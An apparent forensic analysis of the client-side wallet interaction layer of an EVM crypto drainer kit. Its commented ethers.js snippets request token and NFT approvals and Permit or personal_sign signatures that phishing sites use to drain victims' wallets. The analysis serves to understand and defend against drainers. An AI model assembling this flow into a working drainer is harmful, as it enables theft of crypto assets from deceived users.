# EVM Drainer Kit: Web3 Interaction Layer (Client-Side) Code Flow Analysis

**Source Document:** Comprehensive EVM Drainer Forensic Report
**Date of Analysis:** May 12, 2025

## 1. Introduction

This document details the conceptual code execution flow of the **Web3 Interaction Layer (Client-Side)** of a typical EVM wallet drainer kit. This analysis is derived solely from the findings presented in the "Comprehensive EVM Drainer Forensic Report." This layer is a critical part of the phishing frontend, specifically responsible for all direct communications with the victim's Web3 wallet (e.g., MetaMask, Trust Wallet) to request signatures and transaction approvals.

## 2. Core Objectives of the Web3 Interaction Layer Code

Based on the forensic report, the Web3 Interaction Layer code is designed to:

1.  **Establish Wallet Connection:** Interface with the browser's Ethereum provider (`window.ethereum`) to connect to the user's wallet.
2.  **Query Wallet/Blockchain State:** Fetch necessary information such as the connected account address, network ID, ETH balance, and potentially token balances or NFT ownership, as instructed by the main frontend logic or backend.
3.  **Construct Malicious Payloads:** Prepare parameters for various types of malicious actions, including token approvals (`ERC20.approve`), NFT approvals (`ERC721/1155.setApprovalForAll`), and off-chain message signing (e.g., EIP-712 for Permit/Seaport, `personal_sign`).
4.  **Request Signatures/Approvals:** Trigger the user's wallet to display prompts for signing messages or approving transactions.
5.  **Capture Results:** Securely capture the transaction hash (for on-chain actions) or the signature (for off-chain messages) upon user confirmation.
6.  **Relay Information:** Pass the captured results (and any errors) back to the main frontend logic, which then typically forwards it to the backend C2 server.

## 3. Conceptual Code Execution Flow (JavaScript-centric, using Web3 libraries)

The forensic report implies this layer heavily utilizes JavaScript libraries like `ethers.js` or `web3.js`, or directly interacts with `window.ethereum` API. The code is often part of the same obfuscated bundle as the main phishing frontend logic (`drainer.js`, `wallet-handler.js`).

### 3.1. Initializing Provider and Signer

*   **Execution Step 1: Wallet Connection Established (Handled by Phishing Frontend).**
    *   **Logic:** Once the user connects their wallet via the frontend UI, the Web3 Interaction Layer gains access to the Ethereum provider.
    *   **Code Concept (Report Implication - ethers.js):**
        ```javascript
        // Conceptual snippet from report's description of Web3 libraries
        // let provider, signer, userAddress;
        // async function initializeProvider() {
        //     if (window.ethereum) {
        //         provider = new ethers.providers.Web3Provider(window.ethereum);
        //         try {
        //             const accounts = await provider.send("eth_requestAccounts", []);
        //             userAddress = accounts[0];
        //             signer = provider.getSigner(userAddress);
        //             // Notify main frontend logic of successful initialization
        //             console.log("Web3 Interaction Layer Initialized. User:", userAddress);
        //         } catch (error) {
        //             console.error("User denied account access or error in provider init.", error);
        //             throw error; // Propagate error to frontend UI handler
        //         }
        //     } else {
        //         throw new Error("No Ethereum provider found. Please install MetaMask.");
        //     }
        // }
        ```
    *   **Functionality:** Creates instances of a provider and signer object, which are then used for all subsequent blockchain interactions.
    *   **Data Flow:** `userAddress` is obtained and available for use in transactions.
    *   **Report Reference:** "Web3 Interaction Layer (Client-Side)" section in the forensic report.

### 3.2. Fetching On-Chain Data (as needed)

*   **Execution Step 2: Request to Fetch Balances or Other On-Chain Info.**
    *   **Logic:** The main frontend logic might request this layer to fetch victim's asset details to tailor the attack.
    *   **Code Concept (Report Implication - ethers.js):**
        ```javascript
        // Conceptual: Fetching ETH balance
        // async function getEthBalance(address) {
        //     if (!provider) throw new Error("Provider not initialized");
        //     const balanceWei = await provider.getBalance(address || userAddress);
        //     return ethers.utils.formatEther(balanceWei);
        // }

        // Conceptual: Fetching ERC20 token balance
        // const ERC20_ABI_MINIMAL = ["function balanceOf(address owner) view returns (uint256)"];
        // async function getTokenBalance(tokenAddress, ownerAddress) {
        //     if (!provider) throw new Error("Provider not initialized");
        //     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI_MINIMAL, provider);
        //     const balance = await tokenContract.balanceOf(ownerAddress || userAddress);
        //     return balance; // Returns BigNumber, frontend might format it
        // }
        ```
    *   **Functionality:** Uses provider methods to call `eth_getBalance` or `call` (for `balanceOf` on ERC20 contracts).
    *   **Data Flow:** Returns balance information to the calling frontend logic.
    *   **Report Reference:** Implied by the need to identify valuable assets, as mentioned in backend logic and attack tailoring sections.

### 3.3. Crafting and Requesting ERC20/NFT Approvals

*   **Execution Step 3: Request to Approve Token/NFT Spending.**
    *   **Logic:** The main frontend logic, often after receiving instructions from the backend about which assets to target, instructs this layer to request an approval.
    *   **Code Concept (Report Implication - ethers.js for ERC20 `approve`):**
        ```javascript
        // Conceptual: Request ERC20 token approval
        // const ERC20_ABI_APPROVE = ["function approve(address spender, uint256 amount) returns (bool)"];
        // async function requestErc20Approval(tokenAddress, spenderAddress, amount) {
        //     if (!signer) throw new Error("Signer not initialized");
        //     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI_APPROVE, signer);
        //     try {
        //         console.log(`Requesting approval for token ${tokenAddress} to spender ${spenderAddress} for amount ${amount}`);
        //         const txResponse = await tokenContract.approve(spenderAddress, amount);
        //         // DO NOT typically wait for tx.wait() here in drainers, backend monitors mempool
        //         // Frontend just needs to know the tx was submitted.
        //         return { success: true, txHash: txResponse.hash };
        //     } catch (error) {
        //         console.error("ERC20 Approval failed or rejected by user:", error);
        //         return { success: false, error: error.message || error };
        //     }
        // }
        ```
    *   **Code Concept (Report Implication - ethers.js for NFT `setApprovalForAll`):**
        ```javascript
        // Conceptual: Request NFT setApprovalForAll
        // const ERC721_ABI_SETAPPROVAL = ["function setApprovalForAll(address operator, bool approved) returns (void)"];
        // async function requestNftSetApprovalForAll(nftContractAddress, operatorAddress, approvedState = true) {
        //     if (!signer) throw new Error("Signer not initialized");
        //     const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI_SETAPPROVAL, signer);
        //     try {
        //         console.log(`Requesting setApprovalForAll for NFT ${nftContractAddress} to operator ${operatorAddress}`);
        //         const txResponse = await nftContract.setApprovalForAll(operatorAddress, approvedState);
        //         return { success: true, txHash: txResponse.hash };
        //     } catch (error) {
        //         console.error("NFT setApprovalForAll failed or rejected by user:", error);
        //         return { success: false, error: error.message || error };
        //     }
        // }
        ```
    *   **Functionality:** Constructs a transaction object for the `approve` or `setApprovalForAll` method of the target contract. Uses the `signer` to send the transaction, prompting the user via their wallet.
    *   **Data Flow:** `tokenAddress`/`nftContractAddress`, `spenderAddress`/`operatorAddress`, and `amount` are inputs. The output is a transaction hash (if submitted) or an error. This is passed to the main frontend logic.
    *   **Report Reference:** "Victim's Wallet Interaction & Exploitation" and "Drainer Smart Contract(s)" sections highlight the importance of these approval mechanisms.

### 3.4. Crafting and Requesting Off-Chain Signatures (Permit, Seaport, etc.)

*   **Execution Step 4: Request for an Off-Chain Signature.**
    *   **Logic:** For more advanced drainers (as noted in the report, e.g., those using Permit for ERC20s or Seaport for NFTs to avoid gas fees for approvals), this layer crafts and requests an EIP-712 typed data signature or a `personal_sign`.
    *   **Code Concept (Report Implication - ethers.js for EIP-712 `_signTypedData`):**
        ```javascript
        // Conceptual: Request EIP-712 Typed Data Signature (e.g., for Permit)
        // async function requestTypedDataSignature(domain, types, value) {
        //     if (!signer || !provider) throw new Error("Signer/Provider not initialized");
        //     try {
        //         // In ethers.js v5, _signTypedData is available on the signer directly
        //         // For ethers.js v6, it might be provider.send("eth_signTypedData_v4", [userAddress, JSON.stringify({ domain, types, primaryType: Object.keys(types)[0], message: value })]);
        //         // The exact method depends on the ethers.js version and specific EIP-712 structure.
        //         const signature = await signer._signTypedData(domain, types, value);
        //         return { success: true, signature: signature };
        //     } catch (error) {
        //         console.error("Typed Data Signature failed or rejected by user:", error);
        //         return { success: false, error: error.message || error };
        //     }
        // }
        // Example Permit domain and types would be defined here based on EIP-2612
        ```
    *   **Code Concept (Report Implication - `personal_sign`):**
        ```javascript
        // Conceptual: Request personal_sign signature
        // async function requestPersonalSign(message) {
        //     if (!signer) throw new Error("Signer not initialized");
        //     try {
        //         // Message should typically be hex-encoded if it's not human-readable
        //         const messageToSign = ethers.utils.isHexString(message) ? message : ethers.utils.hexlify(ethers.utils.toUtf8Bytes(message));
        //         const signature = await signer.signMessage(ethers.utils.arrayify(messageToSign)); // signMessage expects bytes
        //         // Or directly using provider.send for personal_sign
        //         // const signature = await provider.send("personal_sign", [messageToSign, userAddress]);
        //         return { success: true, signature: signature };
        //     } catch (error) {
        //         console.error("Personal_sign failed or rejected by user:", error);
        //         return { success: false, error: error.message || error };
        //     }
        // }
        ```
    *   **Functionality:** Prepares the EIP-712 domain, types, and message structure, or the message for `personal_sign`. Uses the signer's appropriate method (`_signTypedData` or `signMessage`/`personal_sign` via provider) to prompt the user.
    *   **Data Flow:** The structured data for EIP-712 or the message string is input. The output is the cryptographic signature or an error, passed to the main frontend logic.
    *   **Report Reference:** Advanced drainer techniques in the report mention Permit (EIP-2612) and Seaport (EIP-712) exploitation.

## 4. Error Handling and Obfuscation

*   **Error Handling:** The Web3 Interaction Layer must gracefully handle errors such as user rejection of prompts, insufficient funds for gas (though often the drainer pays gas for the exploit transaction itself), network errors, or incorrect contract interactions. These errors are typically propagated to the main frontend logic to be displayed to the user (often deceptively) or sent to the backend.
*   **Obfuscation:** As with other frontend components, the report stresses that this layer's JavaScript code is heavily obfuscated to prevent analysis and detection.

## 5. Conclusion

The Web3 Interaction Layer acts as the direct bridge to the victim's wallet. Its code execution flow is centered on preparing malicious payloads (for approvals or signatures) based on instructions from the primary frontend logic (which may be influenced by the backend) and then using the wallet's API to present these requests to the victim. The successful capture of a transaction hash or signature is the primary goal, which is then relayed for backend processing to execute the actual asset drain. The sophistication of this layer often dictates the types of assets a drainer can target and its evasiveness.

